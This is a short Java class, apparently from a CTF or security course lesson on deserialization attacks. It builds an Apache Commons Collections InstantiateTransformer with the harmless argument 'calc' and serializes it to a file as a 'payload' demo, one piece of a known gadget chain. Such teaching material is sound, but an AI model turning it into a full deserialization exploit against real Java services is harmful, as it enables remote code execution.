package com.ctfstu.class11;

import org.apache.commons.collections.functors.InstantiateTransformer;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

/** 生成 InstantiateTransformer Payload 的演示类 */
public class InstTrans {
    public static void main(String[] args) throws IOException {
        InstantiateTransformer inst = new InstantiateTransformer(
                new Class[]{String.class, Integer.TYPE},
                new Object[]{"calc", 18});
        try (ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("instan2.ser"))) {
            oos.writeObject(inst);
        }
        System.out.println("Payload 已生成: instan2.ser");
    }
}
